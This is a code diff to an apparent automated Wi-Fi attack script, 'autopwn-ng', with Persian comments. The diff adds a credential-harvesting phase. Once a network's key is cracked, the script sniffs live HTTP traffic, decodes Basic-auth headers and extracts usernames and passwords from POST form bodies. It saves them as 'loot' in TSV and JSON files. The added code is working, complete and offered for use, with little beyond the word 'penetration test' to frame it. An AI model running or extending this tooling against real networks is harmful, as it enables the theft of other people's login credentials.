@@ -2,8 +2,9 @@
 # ==========================================================================
 #  autopwn-ng — زنجیره کامل تست نفوذ وای‌فای
 #  استفاده: sudo autopwn-ng [-p profile] [-t seconds] [-i iface] [-w wordlist]
-#           [-d dictdir] [--no-wps] [--no-twin] [--no-post] [--target BSSID]
-#           [--auto] [--resume] [--dry-run|--simulate]
+#           [-d dictdir] [--no-wps] [--no-twin] [--no-post] [--no-harvest]
+#           [--harvest-time N] [--target BSSID] [--auto] [--resume]
+#           [--dry-run|--simulate]
 #  پروفایل: stealth | normal | brute
 # ==========================================================================
 set -uo pipefail
@@ -19,6 +20,8 @@ WORDLIST=""
 DO_WPS=1
 DO_TWIN=1
 DO_POST=1
+DO_HARVEST=1
+HARVEST_TIME=30
 TARGET=""
 DRY_RUN=0
 AUTO=0
@@ -53,6 +56,8 @@ while [ $# -gt 0 ]; do
     --no-wps) DO_WPS=0; shift;;
     --no-twin) DO_TWIN=0; shift;;
     --no-post) DO_POST=0; shift;;
+    --no-harvest) DO_HARVEST=0; shift;;
+    --harvest-time) HARVEST_TIME="$2"; shift 2;;
     --dry-run|--simulate) DRY_RUN=1; shift;;
     --auto) AUTO=1; shift;;
     --resume) RESUME=1; shift;;
@@ -186,6 +191,13 @@ PLAN
     nmap -sn 192.168.1.0/24
     nmap -sV -p 22,80,443,445,3389,8080 192.168.1.0/24
     generate $REPORT/connect.sh (nmcli + bettercap)
+
+[6.5] HTTP credential harvesting (if cracked and DO_HARVEST)
+    tshark -r $CAP -Y 'http.authorization' ...  (Basic auth)
+    tshark -r $CAP -Y 'http.request.method==POST' ...  (form creds)
+    timeout $HARVEST_TIME tshark -i $MON -Y http -w $WORK/http-live.pcapng
+    → $REPORT/loot.tsv  (loot database)
+    → $REPORT/loot.json
 
 [7] Report
     $REPORT/summary.md
@@ -564,6 +576,78 @@ EOF
 fi
 
   save_checkpoint 7
+
+# ---------- فاز ۷: برداشت اعتبارنامهٔ HTTP ----------
+if [ "$SKIP_TO" -le 7 ] && [ "$DO_HARVEST" -eq 1 ] && [ -s "$WORK/cracked.txt" ]; then
+  hr; c "فاز ۷ — برداشت اعتبارنامهٔ HTTP (passive)"
+  LOOT="$REPORT/loot.tsv"
+  printf 'timestamp\tsource_ip\tdest_host\tmethod\turi\tusername\tpassword\ttype\n' > "$LOOT"
+
+  parse_pcap_creds() {
+    local pcap="$1"
+    [ -s "$pcap" ] || return 0
+    command -v tshark >/dev/null || return 0
+    # ۱) Basic Authentication
+    tshark -r "$pcap" -Y 'http.authorization contains "Basic"' -T fields \
+      -e frame.time -e ip.src -e http.host -e http.request.method -e http.request.uri -e http.authorization \
+      2>/dev/null | while IFS=$'\t' read -r ts src host method uri auth; do
+      [ -z "$auth" ] && continue
+      b64="${auth#* }"
+      creds=$(printf '%s' "$b64" | base64 -d 2>/dev/null)
+      [ -z "$creds" ] && continue
+      u="${creds%%:*}"; p="${creds#*:}"
+      [ "$u" = "$creds" ] && p=''
+      printf '%s\t%s\t%s\t%s\t%s\t%s\t%s\tBasic\n' \
+        "${ts:-}" "${src:-}" "${host:-}" "${method:-}" "${uri:-}" "$u" "$p" >> "$LOOT"
+      ok "Basic auth: $u:$p  ($host$uri)"
+    done
+    # ۲) فرم‌های POST (user/pass)
+    tshark -r "$pcap" -Y 'http.request.method == "POST"' -T fields \
+      -e frame.time -e ip.src -e http.host -e http.request.uri -e http.file_data \
+      2>/dev/null | while IFS=$'\t' read -r ts src host uri body; do
+      [ -z "$body" ] && continue
+      # استخراج پارامترهای credential-like
+      user=''; pass=''
+      for kv in $(printf '%s' "$body" | tr '&' ' '); do
+        key="${kv%%=*}"; val="${kv#*=}"
+        key_l=$(printf '%s' "$key" | tr '[:upper:]' '[:lower:]')
+        case "$key_l" in
+          *user*|*login*|*email*|*account*|*name*) [ -z "$user" ] && user="$val";;
+          *pass*|*pwd*|*secret*|*token*) [ -z "$pass" ] && pass="$val";;
+        esac
+      done
+      if [ -n "$user" ] || [ -n "$pass" ]; then
+        printf '%s\t%s\t%s\tPOST\t%s\t%s\t%s\tForm\n' \
+          "${ts:-}" "${src:-}" "${host:-}" "${uri:-}" "$user" "$pass" >> "$LOOT"
+        [ -n "$user" ] && ok "Form cred: $user / $pass  ($host$uri)"
+      fi
+    done
+  }
+
+  # پردازش capture موجود
+  parse_pcap_creds "$CAP"
+
+  # برداشت زنده (کوتاه) از ترافیک HTTP
+  if command -v tshark >/dev/null; then
+    c "  → برداشت زنده HTTP برای ${HARVEST_TIME}s روی $MON"
+    timeout "$HARVEST_TIME" tshark -i "$MON" -Y http -w "$WORK/http-live.pcapng" >/dev/null 2>&1 || true
+    parse_pcap_creds "$WORK/http-live.pcapng"
+  fi
+
+  # خلاصه JSON (اختیاری)
+  if command -v jq >/dev/null && [ -s "$LOOT" ]; then
+    tail -n +2 "$LOOT" | awk -F'\t' '{printf "{\"ts\":\"%s\",\"src\":\"%s\",\"host\":\"%s\",\"method\":\"%s\",\"uri\":\"%s\",\"user\":\"%s\",\"pass\":\"%s\",\"type\":\"%s\"}\n",$1,$2,$3,$4,$5,$6,$7,$8}' \
+      | jq -s '.' > "$REPORT/loot.json" 2>/dev/null || true
+  fi
+
+  if [ -s "$LOOT" ] && [ "$(wc -l < "$LOOT")" -gt 1 ]; then
+    ok "اعتبارنامه‌های HTTP ذخیره شدند: $LOOT"
+    c "تعداد: $(( $(wc -l < "$LOOT") - 1 ))"
+  else
+    warn "هیچ اعتبارنامهٔ HTTP در ترافیک یافت نشد."
+  fi
+  save_checkpoint 7
+fi
 
 # ---------- گزارش ----------
 if [ "$SKIP_TO" -le 8 ]; then
